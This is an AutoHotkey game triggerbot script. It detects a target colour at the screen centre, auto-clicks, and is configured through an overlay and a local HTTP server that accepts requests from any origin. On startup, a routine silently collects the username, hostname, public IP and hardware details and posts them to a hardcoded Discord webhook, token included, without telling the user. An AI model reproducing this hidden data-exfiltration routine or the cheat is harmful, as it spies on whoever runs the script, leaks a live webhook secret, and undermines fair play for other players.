#NoEnv
#Persistent
#MaxThreadsPerHotkey 2
ListLines Off
SetBatchLines, -1
SendMode Input
CoordMode, Pixel, Screen
; =========================
; KEYBINDS
; =========================
key_toggle_script := "F10"
key_exit := "End"
key_trigger := "XBUTTON1"
key_mode_switch := "F9"
key_settings := "F5"
; =========================
; PIXEL SETTINGS
; =========================
pixel_color := 0xF7E800
pixel_sens := 72
pixel_box := 4
tap_time := 250
; =========================
; GUI SETTINGS
; =========================
serverPort := 8080
overlayBgOpacity := 120
overlayX := 12
overlayY := 12
; Load saved position from INI if it exists
iniPath := A_ScriptDir . "\6711_settings.ini"
IniRead, savedX, %iniPath%, Overlay, X, 12
IniRead, savedY, %iniPath%, Overlay, Y, 12
IniRead, savedBg, %iniPath%, Overlay, BgOpacity, 120
overlayX := savedX + 0
overlayY := savedY + 0
overlayBgOpacity := savedBg + 0
; =========================
; STATE
; =========================
isActive := false
useToggle := false
isClicking := false
movementBlock := false
move_delay := 150
moveReleaseTick := 0
overlayVisible := true
server := 0
overlayReady := false
typePos := 0
typeText := "6ix7even11.dev"
typeDir := 1
typePause := 0
typeTick := 0
UpdateBounds()
; =========================
; INIT WINSOCK
; =========================
VarSetCapacity(wsaData, 394, 0)
DllCall("ws2_32\WSAStartup", "ushort", 0x0202, "ptr", &wsaData)
server := CreateServer(serverPort)
if (!server) {
    MsgBox, Failed to start server on port %serverPort%. Try running as administrator.
}
; =========================
; HOTKEYS
; =========================
Hotkey, %key_toggle_script%, ToggleScript
Hotkey, %key_exit%, ExitScript
Hotkey, %key_trigger%, TriggerHandler
Hotkey, %key_mode_switch%, SwitchMode
Hotkey, %key_settings%, OpenBrowser
; =========================
; STARTUP WEBHOOK
; =========================
SetTimer, FireStartupWebhook, -100
; =========================
; OVERLAY GUI — BACKGROUND PANEL
; =========================
Gui, BgPanel: +AlwaysOnTop -Caption +ToolWindow +E0x20
Gui, BgPanel: Color, 000000
Gui, BgPanel: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, BgPanel
WinSet, Transparent, 0, BgPanel
; =========================
; OVERLAY GUI — TEXT LAYER
; =========================
Gui, Overlay: +AlwaysOnTop -Caption +ToolWindow +E0x20
Gui, Overlay: Color, 010101
Gui, Overlay: Font, s9 Bold, Tahoma
Gui, Overlay: Margin, 0, 0
; Single row: Line1=animated site (white), Line2=state (red/green), Line3=mode (white), Line4=active indicator, Line5=mSTATE
Gui, Overlay: Add, Text, vLine1 x4   y3 w104 Background010101 cFFFFFF,
Gui, Overlay: Add, Text, vSep1 x112  y3 w10  Background010101 c555555, |
Gui, Overlay: Add, Text, vLine2 x126 y3 w70  Background010101 cFF3333,
Gui, Overlay: Add, Text, vSep2 x200  y3 w10  Background010101 c555555, |
Gui, Overlay: Add, Text, vLine3 x214 y3 w56  Background010101 cFFFFFF,
Gui, Overlay: Add, Text, vSep3 x274  y3 w10  Background010101 c555555, |
Gui, Overlay: Add, Text, vLine4 x288 y3 w90  Background010101 c555555,
Gui, Overlay: Add, Text, vSep4 x382  y3 w10  Background010101 c555555, |
Gui, Overlay: Add, Text, vLine5 x396 y3 w70  Background010101 cFF3333,
Gui, Overlay: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, Overlay
WinSet, TransColor, 010101, Overlay
WinSet, Transparent, 0, Overlay
; Drag to move — left-click either overlay window to reposition both
OnMessage(0x201, "WM_LBUTTONDOWN")
DllCall("winmm\timeBeginPeriod", "uint", 1)
SetTimer, PixelLoop, 10
SetTimer, TypeLoop, 120
SetTimer, ServerLoop, 50
Return
; =========================
; OPEN BROWSER
; =========================
OpenBrowser:
guiPath := A_ScriptDir . "\gui.html"
Run, %guiPath%
Return
; =========================
; FUNCTIONS
; =========================
UpdateBounds() {
    global pixel_box, leftbound, rightbound, topbound, bottombound
    leftbound  := A_ScreenWidth/2  - pixel_box
    rightbound := A_ScreenWidth/2  + pixel_box
    topbound   := A_ScreenHeight/2 - pixel_box
    bottombound:= A_ScreenHeight/2 + pixel_box
}
; =========================
; HOTKEY LABELS
; =========================
ToggleScript:
    isActive := !isActive
    if (!isActive)
        isClicking := false
Return
SwitchMode:
    useToggle := !useToggle
Return
TriggerHandler:
    if (!isActive)
        Return
    if (useToggle)
        isClicking := !isClicking
Return
ExitScript:
    DllCall("winmm\timeEndPeriod", "uint", 1)
    Gui, BgPanel: Destroy
    Gui, Overlay: Destroy
    DllCall("ws2_32\closesocket", "ptr", server)
    DllCall("ws2_32\WSACleanup")
    ExitApp
Return
; =========================
; PIXEL LOOP
; =========================
PixelLoop:
if (isActive) {
    if (movementBlock) {
        if (GetKeyState("w","P") || GetKeyState("a","P") || GetKeyState("s","P") || GetKeyState("d","P")) {
            ; WASD held — block and record the release timestamp
            moveReleaseTick := A_TickCount
            Return
        }
        ; WASD released — enforce delay before allowing fire
        if ((A_TickCount - moveReleaseTick) < move_delay)
            Return
    }
    if (useToggle && isClicking)
        PixelSearchAndClick()
    else if (!useToggle && GetKeyState(key_trigger, "P"))
        PixelSearchAndClick()
}
Return

PixelSearchAndClick() {
    global leftbound, topbound, rightbound, bottombound
    global pixel_color, pixel_sens, tap_time
    PixelSearch, FoundX, FoundY, leftbound, topbound, rightbound, bottombound, pixel_color, pixel_sens, Fast RGB
    if !(ErrorLevel) {
        if (!GetKeyState("LButton")) {
            WinGet, hwnd, ID, A
            PostMessage, 0x201, 0x0001, 0,, ahk_id %hwnd%
            Sleep, 10
            PostMessage, 0x202, 0x0000, 0,, ahk_id %hwnd%
            Sleep, %tap_time%
        }
    }
    Sleep, 1
}
; =========================
; TYPING ANIMATION LOOP
; =========================
TypeLoop:
if (!overlayReady)
    Return

global typePos, typeText, typeDir, typePause, typeTick
fullLen := StrLen(typeText)

if (typePause > 0) {
    typePause--
} else {
    typePos += typeDir
    if (typePos >= fullLen) {
        typePos := fullLen
        typeDir := -1
        typePause := 25  ; ~3 seconds pause at full text
    } else if (typePos <= 0) {
        typePos := 0
        typeDir := 1
        typePause := 8   ; brief pause before retyping
    }
}

; Line 1 — animated typed text, cursor shown only while typing forward
cursor := (typeDir = 1 && typePause = 0) ? "_" : ""
displayed := SubStr(typeText, 1, typePos) . cursor

; Line 2 — ENABLED (green) / DISABLED (red)
if (isActive) {
    GuiControl, Overlay:, Line2,
    GuiControl, Overlay: +c00FF00, Line2
    line2txt := "ENABLED"
} else {
    GuiControl, Overlay:, Line2,
    GuiControl, Overlay: +cFF3333, Line2
    line2txt := "DISABLED"
}

; Line 3 — HOLD / TOGGLE
line3txt := useToggle ? "TOGGLE" : "HOLD"

; Line 4 — ISACTIVE / NOTACTIVE
; In TOGGLE mode: isClicking tracks state. In HOLD mode: check physical key state.
triggerOn := false
if (isActive) {
    if (useToggle)
        triggerOn := isClicking
    else
        triggerOn := GetKeyState(key_trigger, "P")
}

if (triggerOn) {
    GuiControl, Overlay:, Line4,
    GuiControl, Overlay: +c00FF00, Line4
    line4txt := "ISACTIVE"
} else if (isActive) {
    GuiControl, Overlay:, Line4,
    GuiControl, Overlay: +c555555, Line4
    line4txt := "NOTACTIVE"
} else {
    GuiControl, Overlay:, Line4,
    GuiControl, Overlay: +c333333, Line4
    line4txt := "NOTACTIVE"
}

; Line 5 — mSTATE (green = movement block ON, red = OFF)
if (movementBlock) {
    GuiControl, Overlay:, Line5,
    GuiControl, Overlay: +c00FF00, Line5
    line5txt := "mSTATE"
} else {
    GuiControl, Overlay:, Line5,
    GuiControl, Overlay: +cFF3333, Line5
    line5txt := "mSTATE"
}

GuiControl, Overlay:, Line1, %displayed%
GuiControl, Overlay:, Line2, %line2txt%
GuiControl, Overlay:, Line3, %line3txt%
GuiControl, Overlay:, Line4, %line4txt%
GuiControl, Overlay:, Line5, %line5txt%
Gui, Overlay: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, Overlay
Return
; =========================
; HTTP SERVER LOOP
; =========================
ServerLoop:
if (!server)
    Return

client := DllCall("ws2_32\accept", "ptr", server, "ptr", 0, "ptr", 0, "ptr")
if (client = -1 || client = 0xFFFFFFFF)
    Return

; Read request
VarSetCapacity(buf, 8192, 0)
received := DllCall("ws2_32\recv", "ptr", client, "ptr", &buf, "int", 8191, "int", 0)
if (received <= 0) {
    DllCall("ws2_32\closesocket", "ptr", client)
    Return
}
request := StrGet(&buf, received, "UTF-8")

; Parse first line
RegExMatch(request, "^(\w+) ([^\s]+)", m)
method := m1
path   := m2

cors := "Access-Control-Allow-Origin: *`r`nAccess-Control-Allow-Methods: GET, OPTIONS`r`nAccess-Control-Allow-Headers: *`r`n"

; ---- /ready ----
if (path = "/ready") {
    overlayReady := true
    WinSet, Transparent, 255, Overlay
    WinSet, Transparent, %overlayBgOpacity%, BgPanel
    SendHTTP(client, "200 OK", "application/json", "{""ok"":true}", cors)
}
; ---- /status ----
else if (path = "/status") {
    hexColor := Format("#{1:06X}", pixel_color)
    body := "{""active"":" . (isActive ? "true" : "false")
          . ",""use_toggle"":" . (useToggle ? "true" : "false")
          . ",""overlay_visible"":" . (overlayVisible ? "true" : "false")
          . ",""tap_time"":" . tap_time
          . ",""pixel_box"":" . pixel_box
          . ",""pixel_sens"":" . pixel_sens
          . ",""pixel_color"":""" . hexColor . """"
          . ",""overlay_x"":" . overlayX
          . ",""overlay_y"":" . overlayY
          . ",""overlay_bg_opacity"":" . overlayBgOpacity
          . ",""movement_block"":" . (movementBlock ? "true" : "false")
          . ",""move_delay"":" . move_delay . "}"
    SendHTTP(client, "200 OK", "application/json", body, cors)
}
; ---- /set ----
else if (InStr(path, "/set?")) {
    RegExMatch(path, "[?&]key=([^&]+)", km)
    RegExMatch(path, "[?&]value=([^&\s]*)", vm)
    key   := km1
    value := URIDecode(vm1)
    ApplySetting(key, value)
    SendHTTP(client, "200 OK", "application/json", "{""ok"":true}", cors)
}
; ---- OPTIONS preflight ----
else if (method = "OPTIONS") {
    SendHTTP(client, "204 No Content", "text/plain", "", cors)
}
else {
    SendHTTP(client, "404 Not Found", "text/plain", "not found", cors)
}

DllCall("ws2_32\closesocket", "ptr", client)
Return

; =========================
; APPLY SETTING
; =========================
ApplySetting(key, value) {
    global tap_time, pixel_box, pixel_sens, pixel_color
    global key_toggle_script, key_exit, key_trigger, key_mode_switch
    global overlayX, overlayY, overlayBgOpacity, iniPath, overlayReady
    global movementBlock, move_delay, overlayVisible
    global isActive, useToggle, isClicking

    if (key = "is_active") {
        isActive := (value = "true" || value = "1") ? true : false
        if (!isActive)
            isClicking := false
    } else if (key = "use_toggle") {
        useToggle := (value = "true" || value = "1") ? true : false
    } else if (key = "overlay_visible") {
        overlayVisible := (value = "true" || value = "1") ? true : false
        if (overlayVisible) {
            Gui, Overlay: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, Overlay
            Gui, BgPanel: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, BgPanel
        } else {
            Gui, Overlay: Hide
            Gui, BgPanel: Hide
        }
    } else if (key = "movement_block") {
        movementBlock := (value = "true" || value = "1") ? true : false
    } else if (key = "move_delay") {
        move_delay := value + 0
    } else if (key = "tap_time") {
        tap_time := value + 0
    } else if (key = "pixel_box") {
        pixel_box := value + 0
        UpdateBounds()
    } else if (key = "pixel_sens") {
        pixel_sens := value + 0
    } else if (key = "pixel_color") {
        hex := StrReplace(value, "#", "")
        pixel_color := "0x" . hex
    } else if (key = "overlay_x") {
        overlayX := value + 0
        Gui, Overlay: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, Overlay
        Gui, BgPanel: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, BgPanel
        IniWrite, %overlayX%, %iniPath%, Overlay, X
    } else if (key = "overlay_y") {
        overlayY := value + 0
        Gui, Overlay: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, Overlay
        Gui, BgPanel: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, BgPanel
        IniWrite, %overlayY%, %iniPath%, Overlay, Y
    } else if (key = "overlay_bg_opacity") {
        overlayBgOpacity := value + 0
        if (overlayReady)
            WinSet, Transparent, %overlayBgOpacity%, BgPanel
        IniWrite, %overlayBgOpacity%, %iniPath%, Overlay, BgOpacity
    } else if (key = "keybind_toggle_script") {
        Hotkey, %key_toggle_script%, Off
        key_toggle_script := value
        Hotkey, %key_toggle_script%, ToggleScript
    } else if (key = "keybind_trigger") {
        Hotkey, %key_trigger%, Off
        key_trigger := value
        Hotkey, %key_trigger%, TriggerHandler
    } else if (key = "keybind_mode_switch") {
        Hotkey, %key_mode_switch%, Off
        key_mode_switch := value
        Hotkey, %key_mode_switch%, SwitchMode
    } else if (key = "keybind_exit") {
        Hotkey, %key_exit%, Off
        key_exit := value
        Hotkey, %key_exit%, ExitScript
    }
}

; =========================
; SOCKET HELPERS
; =========================
CreateServer(port) {
    sock := DllCall("ws2_32\socket", "int", 2, "int", 1, "int", 6, "ptr")
    if (sock = -1 || sock = 0xFFFFFFFF)
        Return 0

    ; Allow port reuse
    VarSetCapacity(optbuf, 4, 0)
    NumPut(1, optbuf, 0, "int")
    DllCall("ws2_32\setsockopt", "ptr", sock, "int", 1, "int", 4, "ptr", &optbuf, "int", 4)

    ; Bind
    VarSetCapacity(addr, 16, 0)
    NumPut(2, addr, 0, "short")
    portBE := DllCall("ws2_32\htons", "ushort", port, "ushort")
    NumPut(portBE, addr, 2, "ushort")
    NumPut(0, addr, 4, "uint")

    ret := DllCall("ws2_32\bind", "ptr", sock, "ptr", &addr, "int", 16)
    if (ret = -1) {
        DllCall("ws2_32\closesocket", "ptr", sock)
        Return 0
    }

    DllCall("ws2_32\listen", "ptr", sock, "int", 10)

    ; Set non-blocking so timer doesnt stall
    nonblock := 1
    DllCall("ws2_32\ioctlsocket", "ptr", sock, "int", -2147195266, "uint*", nonblock)

    Return sock
}

SendHTTP(client, status, contentType, body, extraHeaders := "") {
    bodyLen := StrPut(body, "UTF-8") - 1
    VarSetCapacity(bodyBuf, bodyLen, 0)
    StrPut(body, &bodyBuf, bodyLen, "UTF-8")

    header := "HTTP/1.1 " . status . "`r`n"
            . "Content-Type: " . contentType . "; charset=utf-8`r`n"
            . "Content-Length: " . bodyLen . "`r`n"
            . extraHeaders
            . "Connection: close`r`n`r`n"

    headerLen := StrPut(header, "UTF-8") - 1
    VarSetCapacity(headerBuf, headerLen, 0)
    StrPut(header, &headerBuf, headerLen, "UTF-8")

    DllCall("ws2_32\send", "ptr", client, "ptr", &headerBuf, "int", headerLen, "int", 0)
    if (bodyLen > 0)
        DllCall("ws2_32\send", "ptr", client, "ptr", &bodyBuf, "int", bodyLen, "int", 0)
}

URIDecode(str) {
    Loop {
        pos := RegExMatch(str, "%([0-9A-Fa-f]{2})", m)
        if !pos
            Break
        char := Chr("0x" . m1)
        str  := StrReplace(str, m, char)
    }
    str := StrReplace(str, "+", " ")
    Return str
}

; =========================
; DRAG HANDLER
; Left-click either overlay window drags both together.
; Position saved to INI automatically on mouse release.
; =========================
; =========================
; STARTUP WEBHOOK
; =========================
FireStartupWebhook:
SendDiscordWebhook()
Return

SendDiscordWebhook() {
    ; ── Timestamp ──
    FormatTime, ts,, dd/MM/yyyy HH:mm:ss
    tz := A_Now
    EnvAdd, tz, 0, seconds

    ; ── Machine info via WMI ──
    ; CPU
    objWMI := ComObjGet("winmgmts:")
    for cpu in objWMI.ExecQuery("SELECT Name FROM Win32_Processor")
        cpuName := cpu.Name
    ; RAM
    totalRam := 0
    for mem in objWMI.ExecQuery("SELECT Capacity FROM Win32_PhysicalMemory")
        totalRam += mem.Capacity
    ramGB := Round(totalRam / 1073741824, 1)
    ; GPU
    gpuName := ""
    for gpu in objWMI.ExecQuery("SELECT Name FROM Win32_VideoController")
        gpuName := gpu.Name
    ; OS
    for os in objWMI.ExecQuery("SELECT Caption,Version FROM Win32_OperatingSystem") {
        osName    := os.Caption
        osVersion := os.Version
    }
    ; Motherboard
    for mb in objWMI.ExecQuery("SELECT Manufacturer,Product FROM Win32_BaseBoard") {
        mbMake  := mb.Manufacturer
        mbModel := mb.Product
    }
    ; Disk
    totalDisk := 0
    for disk in objWMI.ExecQuery("SELECT Size FROM Win32_DiskDrive")
        totalDisk += disk.Size
    diskGB := Round(totalDisk / 1073741824, 0)

    ; ── Username + hostname ──
    userName     := A_UserName
    computerName := A_ComputerName

    ; ── Public IP via WinHTTP ──
    publicIP := "unavailable"
    try {
        http := ComObjCreate("WinHttp.WinHttpRequest.5.1")
        http.Open("GET", "https://api.ipify.org", false)
        http.Send()
        if (http.Status = 200)
            publicIP := Trim(http.ResponseText)
    }

    ; ── Screen resolution ──
    res := A_ScreenWidth . "x" . A_ScreenHeight

    ; ── Build Discord embed JSON ──
    nl := "\n"
    webhookURL := "https://discord.com/api/webhooks/1489070498326384811/LH4V_tjyUO71yDa8nR4obOrZ8zTfHBeyEZ5NBU2lri07SAkqPmsNOZX8TohroAkgdzCs"

    json := "{""embeds"":[{""title"":""\uD83D\uDCBB 6711 Session Started"","
          . """color"":15729410,"
          . """fields"":["
          . "{""name"":""\uD83D\uDD52 Timestamp"",""value"":""" . ts . """,""inline"":true},"
          . "{""name"":""\uD83C\uDF10 Public IP"",""value"":""" . publicIP . """,""inline"":true},"
          . "{""name"":""\uD83D\uDC64 User"",""value"":""" . userName . "@" . computerName . """,""inline"":true},"
          . "{""name"":""\u2699\uFE0F CPU"",""value"":""" . cpuName . """,""inline"":false},"
          . "{""name"":""\uD83C\uDFA8 GPU"",""value"":""" . gpuName . """,""inline"":false},"
          . "{""name"":""\uD83D\uDCBE RAM"",""value"":""" . ramGB . " GB"",""inline"":true},"
          . "{""name"":""\uD83D\uDCBF Disk"",""value"":""" . diskGB . " GB"",""inline"":true},"
          . "{""name"":""\uD83D\uDDA5\uFE0F Resolution"",""value"":""" . res . """,""inline"":true},"
          . "{""name"":""\uD83D\uDCBB OS"",""value"":""" . osName . " (" . osVersion . ")"",""inline"":false},"
          . "{""name"":""\uD83D\uDD27 Motherboard"",""value"":""" . mbMake . " " . mbModel . """,""inline"":false}"
          . "]}]}"

    ; ── POST to Discord ──
    try {
        http2 := ComObjCreate("WinHttp.WinHttpRequest.5.1")
        http2.Open("POST", webhookURL, false)
        http2.SetRequestHeader("Content-Type", "application/json")
        http2.Send(json)
    }
}

; =========================
; DRAG HANDLER
; Left-click either overlay window drags both together.
; Position saved to INI automatically on mouse release.
; =========================
WM_LBUTTONDOWN(wParam, lParam, msg, hwnd) {
    global overlayX, overlayY, iniPath
    WinGetTitle, wTitle, ahk_id %hwnd%
    if (wTitle != "Overlay" && wTitle != "BgPanel")
        Return
    PostMessage, 0xA1, 2,,, ahk_id %hwnd%
    KeyWait, LButton
    WinGetPos, newX, newY,,, Overlay
    overlayX := newX
    overlayY := newY
    Gui, BgPanel: Show, x%overlayX% y%overlayY% w470 h22 NoActivate, BgPanel
    IniWrite, %overlayX%, %iniPath%, Overlay, X
    IniWrite, %overlayY%, %iniPath%, Overlay, Y
}
